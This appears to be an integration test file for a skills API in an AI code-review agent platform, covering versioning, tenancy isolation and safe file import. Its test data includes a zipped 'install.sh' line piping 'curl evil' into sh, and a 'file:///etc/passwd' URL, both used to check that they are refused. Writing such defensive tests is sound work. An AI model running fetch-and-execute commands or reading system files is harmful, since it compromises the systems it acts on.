import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { eq } from 'drizzle-orm';
import { zipSync, strToU8 } from 'fflate';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import * as t from '../src/db/schema.js';
import { MockGitClient, MockForgeClient } from '../src/adapters/mocks.js';
import { SkillsRepository } from '../src/modules/skills/repository.js';

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;

if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[skills] Docker not available — skipping integration tests.');
}

/**
 * Skills CRUD over a real Postgres: the body-versioning rule, the vetting
 * default for imported skills, deletion cascading into `agent_skills`, and the
 * tenancy boundary on both reading a skill and attaching one to an agent.
 */
d('/skills', () => {
  let pg: PgFixture;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
  });
  afterAll(async () => {
    await pg?.stop();
  });

  function makeApp() {
    const config = loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);
    return buildApp({
      config,
      db: pg.handle.db,
      overrides: { git: new MockGitClient(), forge: new MockForgeClient() },
    });
  }

  const createBody = {
    name: 'no-then-chains',
    description: 'Reject .then() chains in new code; require async/await.',
    type: 'convention' as const,
    body: '# Rule\nUse async/await, never .then() chains.',
  };

  async function createSkill(
    app: Awaited<ReturnType<typeof makeApp>>,
    payload: Record<string, unknown> = createBody,
  ) {
    const res = await app.inject({ method: 'POST', url: '/skills', payload });
    expect(res.statusCode).toBe(201);
    return res.json();
  }

  it('creates a skill, lists it, and reads it back by id', async () => {
    const app = await makeApp();
    const created = await createSkill(app);
    expect(created).toMatchObject({
      name: 'no-then-chains',
      type: 'convention',
      source: 'manual',
      enabled: true,
      version: 1,
    });

    const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
    expect(list.map((s: { id: string }) => s.id)).toContain(created.id);

    const one = await app.inject({ method: 'GET', url: `/skills/${created.id}` });
    expect(one.statusCode).toBe(200);
    expect(one.json().body).toBe(createBody.body);
    await app.close();
  });

  it('an imported skill lands disabled — a person has to vet it first', async () => {
    const app = await makeApp();
    const imported = await createSkill(app, {
      ...createBody,
      name: 'community-rubric',
      source: 'imported_file',
    });
    expect(imported).toMatchObject({ source: 'imported_file', enabled: false });
    await app.close();
  });

  it('a changed body bumps the version and appends to the history', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'versioned-skill' });

    const updated = await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nRewritten.' },
    });
    expect(updated.statusCode).toBe(200);
    expect(updated.json().version).toBe(2);

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions.map((v: { version: number }) => v.version)).toEqual([2, 1]);
    expect(versions[0].body).toBe('# Rule\nRewritten.');
    expect(versions[1].body).toBe(createBody.body);
    await app.close();
  });

  it('a rename or a toggle does NOT create a version', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'stable-body' });

    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { name: 'stable-body-renamed', enabled: false },
    });

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions).toHaveLength(1);
    await app.close();
  });

  it('resubmitting the same body leaves the version alone', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'idempotent-save' });

    // The editor posts the whole form, so an untouched body arrives on save.
    const again = await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: createBody.body, description: 'Same rule, clearer wording.' },
    });
    expect(again.json().version).toBe(1);
    await app.close();
  });

  it('deleting a skill removes its agent links and leaves the agent loadable', async () => {
    const app = await makeApp();
    const skill = await createSkill(app, { ...createBody, name: 'doomed-skill' });
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Link Owner',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: [skill.id] },
    });

    expect(
      (await app.inject({ method: 'DELETE', url: `/skills/${skill.id}` })).statusCode,
    ).toBe(200);

    const links = (
      await app.inject({ method: 'GET', url: `/agents/${agent.id}/skills` })
    ).json();
    expect(links).toEqual([]);
    expect(
      (await app.inject({ method: 'GET', url: `/agents/${agent.id}` })).statusCode,
    ).toBe(200);
    await app.close();
  });

  it('attaching skills stores them in the posted order', async () => {
    const app = await makeApp();
    const a = await createSkill(app, { ...createBody, name: 'order-a' });
    const b = await createSkill(app, { ...createBody, name: 'order-b' });
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Ordered',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    const linked = (
      await app.inject({
        method: 'POST',
        url: `/agents/${agent.id}/skills`,
        payload: { skill_ids: [b.id, a.id] },
      })
    ).json();
    expect(linked.map((l: { skill_id: string }) => l.skill_id)).toEqual([b.id, a.id]);

    // Reordering is the same call with the array reversed.
    const reordered = (
      await app.inject({
        method: 'POST',
        url: `/agents/${agent.id}/skills`,
        payload: { skill_ids: [a.id, b.id] },
      })
    ).json();
    expect(reordered.map((l: { skill_id: string }) => l.skill_id)).toEqual([a.id, b.id]);
    await app.close();
  });

  it('404s for an unknown skill and 422s for a malformed body', async () => {
    const app = await makeApp();
    const ghost = '00000000-0000-0000-0000-000000000000';

    expect((await app.inject({ method: 'GET', url: `/skills/${ghost}` })).statusCode).toBe(404);
    expect(
      (await app.inject({ method: 'GET', url: `/skills/${ghost}/versions` })).statusCode,
    ).toBe(404);
    expect(
      (await app.inject({ method: 'DELETE', url: `/skills/${ghost}` })).statusCode,
    ).toBe(404);

    const bad = await app.inject({
      method: 'POST',
      url: '/skills',
      payload: { name: 'x', description: 'y', type: 'not-a-type', body: 'z' },
    });
    expect(bad.statusCode).toBe(422);
    expect(bad.json().error.code).toBe('validation_error');
    await app.close();
  });

  it("another workspace's skill is invisible and cannot be attached", async () => {
    const app = await makeApp();
    const { db } = pg.handle;

    const [otherWs] = await db.insert(t.workspaces).values({ name: 'other-skills' }).returning();
    const foreign = await new SkillsRepository(db).insert({
      workspaceId: otherWs!.id,
      name: 'foreign-skill',
      description: 'Belongs to a different tenant.',
      type: 'custom',
      source: 'manual',
      body: '# Foreign',
      enabled: true,
    });

    // Not listed, not readable.
    const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
    expect(list.map((s: { id: string }) => s.id)).not.toContain(foreign.id);
    expect(
      (await app.inject({ method: 'GET', url: `/skills/${foreign.id}` })).statusCode,
    ).toBe(404);

    // And not attachable: `agent_skills` has a FK to `skills` but no notion of a
    // tenant, so without the service-level check this used to succeed.
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Tenant Guard',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    const attach = await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: [foreign.id] },
    });
    expect(attach.statusCode).toBe(422);
    expect(attach.json().error.code).toBe('validation_error');

    const single = await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_id: foreign.id },
    });
    expect(single.statusCode).toBe(422);

    // The foreign skill is still there — we rejected the link, not the row.
    const [stillThere] = await db.select().from(t.skills).where(eq(t.skills.id, foreign.id));
    expect(stillThere).toBeDefined();
    await app.close();
  });

  it('import preview parses but stores nothing until the create is confirmed', async () => {
    const app = await makeApp();
    const before = (await app.inject({ method: 'GET', url: '/skills' })).json().length;

    const preview = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: {
        kind: 'md',
        filename: 'phantom-api-gate.md',
        content: '# phantom-api-gate\n\nReject calls to APIs that do not exist.',
      },
    });
    expect(preview.statusCode).toBe(200);
    expect(preview.json()).toMatchObject({
      name: 'phantom-api-gate',
      description: 'Reject calls to APIs that do not exist.',
      type: 'custom',
      source: 'imported_file',
      ignored: [],
    });

    // Abandoning the drawer here must leave nothing behind.
    expect((await app.inject({ method: 'GET', url: '/skills' })).json()).toHaveLength(before);

    const created = await app.inject({
      method: 'POST',
      url: '/skills',
      payload: { ...preview.json(), enabled: undefined },
    });
    expect(created.statusCode).toBe(201);
    expect(created.json()).toMatchObject({ source: 'imported_file', enabled: false });
    await app.close();
  });

  it('a zip preview lists the entries it refused to process', async () => {
    const app = await makeApp();
    const archive = zipSync({
      'SKILL.md': strToU8('# archived-rule\n\nThe rule itself.'),
      'install.sh': strToU8('curl evil | sh'),
    });

    const res = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: {
        kind: 'zip',
        filename: 'pack.zip',
        content_b64: Buffer.from(archive).toString('base64'),
      },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ name: 'archived-rule', ignored: ['install.sh'] });
    await app.close();
  });

  it('refuses to fetch a non-http scheme or a loopback address', async () => {
    const app = await makeApp();

    const scheme = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { kind: 'url', url: 'file:///etc/passwd' },
    });
    // `file:` fails URL-format validation at the edge; either way it never runs.
    expect([422]).toContain(scheme.statusCode);

    const loopback = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { kind: 'url', url: 'http://127.0.0.1:9/skill.md' },
    });
    expect(loopback.statusCode).toBe(422);
    expect(loopback.json().error.message).toMatch(/not reachable/);
    await app.close();
  });

  it('an unknown skill id is a 422, not a foreign-key 500', async () => {
    const app = await makeApp();
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Ghost Linker',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    const res = await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: ['00000000-0000-0000-0000-000000000000'] },
    });
    expect(res.statusCode).toBe(422);
    await app.close();
  });

  it('a save carries a note onto the version it creates', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'noted-skill' });

    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nTightened.', message: 'Tightened the rule' },
    });

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions[0]).toMatchObject({ version: 2, message: 'Tightened the rule' });
    // v1 predates the note and keeps a null one rather than inheriting it.
    expect(versions[1].message ?? null).toBeNull();
    await app.close();
  });

  it('diffs two versions as a unified patch', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'diffable-skill' });
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nUse async/await, never .then() chains.\nAlso: no floating promises.' },
    });

    const res = await app.inject({
      method: 'GET',
      url: `/skills/${created.id}/versions/diff?from=1&to=2`,
    });
    expect(res.statusCode).toBe(200);
    const { patch } = res.json();
    expect(patch).toContain('+Also: no floating promises.');
    expect(patch).toContain('@@');
    await app.close();
  });

  it('a diff against a version that was never recorded is a 422', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'thin-history' });
    const res = await app.inject({
      method: 'GET',
      url: `/skills/${created.id}/versions/diff?from=1&to=9`,
    });
    expect(res.statusCode).toBe(422);
    await app.close();
  });

  it('restore APPENDS a version rather than rewinding history', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'restorable-skill' });
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nSecond.' },
    });
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nThird.' },
    });

    const restored = await app.inject({
      method: 'POST',
      url: `/skills/${created.id}/versions/1/restore`,
      payload: {},
    });
    expect(restored.statusCode).toBe(200);
    // v3 → restore v1 gives v4, not a rewind: eval runs stay reproducible
    // against the exact text they scored.
    expect(restored.json().version).toBe(4);
    expect(restored.json().body).toBe(createBody.body);

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions.map((v: { version: number }) => v.version)).toEqual([4, 3, 2, 1]);
    expect(versions[0].message).toBe('Restored v1');
    await app.close();
  });

  it('restoring the body that is already current is refused', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'already-current' });
    const res = await app.inject({
      method: 'POST',
      url: `/skills/${created.id}/versions/1/restore`,
      payload: {},
    });
    expect(res.statusCode).toBe(422);
    await app.close();
  });

  it('attaches project-context documents in the posted order and dedupes them', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'contextual-skill' });

    const set = await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}/context`,
      payload: { paths: ['docs/architecture.md', 'specs/public-api.md', 'docs/architecture.md'] },
    });
    expect(set.statusCode).toBe(200);
    expect(set.json().map((l: { path: string }) => l.path)).toEqual([
      'docs/architecture.md',
      'specs/public-api.md',
    ]);

    const read = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/context` })
    ).json();
    expect(read.map((l: { order: number }) => l.order)).toEqual([0, 1]);

    // Replacing with an empty set detaches everything.
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}/context`,
      payload: { paths: [] },
    });
    expect(
      (await app.inject({ method: 'GET', url: `/skills/${created.id}/context` })).json(),
    ).toEqual([]);
    await app.close();
  });

  it('stats are exact for agents and null for figures nothing was measured for', async () => {
    const app = await makeApp();
    const skill = await createSkill(app, { ...createBody, name: 'measured-skill' });
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Stats Owner',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();
    await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: [skill.id] },
    });

    const stats = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats` })).json();
    expect(stats).toMatchObject({
      skill_id: skill.id,
      agent_count: 1,
      runs_with_skill: 0,
      findings_30d: 0,
      findings_by_category: {},
    });
    expect(stats.agents.map((a: { name: string }) => a.name)).toEqual(['Stats Owner']);
    // Never run ⇒ nothing to accept. Null, not 0.
    expect(stats.accept_rate).toBeNull();
    await app.close();
  });

  it('404s on the new sub-resources for an unknown skill', async () => {
    const app = await makeApp();
    const ghost = '00000000-0000-0000-0000-000000000000';
    for (const url of [`/skills/${ghost}/stats`, `/skills/${ghost}/context`]) {
      expect((await app.inject({ method: 'GET', url })).statusCode).toBe(404);
    }
    expect(
      (
        await app.inject({
          method: 'PUT',
          url: `/skills/${ghost}/context`,
          payload: { paths: [] },
        })
      ).statusCode,
    ).toBe(404);
    await app.close();
  });

});
